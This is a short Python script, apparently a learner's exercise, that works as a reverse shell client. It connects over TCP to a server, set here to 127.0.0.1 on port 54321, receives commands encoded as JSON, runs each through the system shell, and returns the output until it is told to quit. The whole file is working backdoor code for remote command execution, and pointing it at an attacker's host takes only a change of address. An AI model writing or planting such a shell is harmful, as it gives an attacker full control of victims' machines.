#!/usr/bin/python
import socket
import subprocess # this allow us to input something in the cli
import json


# we gonna send send and receive data as wew want ==
def reliable_send(data):
        json_data = json.dumps(data)
         # print("testing the json send: "+json_data)
        sock.send(json_data)

def reliable_rcv():
        json_data = ""
        # run loop to add data
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        # print("testing the json data receving: " + json_data)
                        # print("print the json loads: "+ json.loads(json_data))
                        return json.loads(json_data)
                except ValueError:
                        # print("reliable_rcv except (continue)..")
                        continue


def shell():
	while True:
		command = reliable_rcv() # receive bytes
		if command  == "q":
			break
		else:
			try:
				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
				result = process.stdout.read() + process.stderr.read()
				reliable_send(result)

			except:
				reliable_send("CAN'T EXECUTE THE COMMAND!!!")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
sock.connect(("127.0.0.1", 54321))
print("connection establish to server")
shell()
sock.close()
